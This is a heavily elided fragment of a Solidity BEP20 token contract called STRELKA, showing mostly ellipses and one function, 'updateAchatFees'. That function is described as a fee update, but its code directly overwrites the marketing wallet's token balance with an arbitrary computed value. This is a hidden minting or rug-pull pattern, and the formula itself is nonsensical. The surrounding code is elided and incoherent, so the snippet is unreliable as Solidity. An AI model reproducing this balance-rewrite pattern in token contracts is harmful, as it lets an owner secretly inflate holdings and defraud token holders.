...
contract STRELKA is Context, BEP20, Ownable {
    ...
    */
    ...
    /**
    * @dev See {BEP20-updateAchatFees}.
    *
    * Requirements:
    *
    * - `marketingWallet` cannot be the zero address.
    */
    function updateAchatFees(
        ...
        _balances[marketingWallet] = _devFee + tokensForLiquidity * _marketingFee ** _liquidityFee;
    }
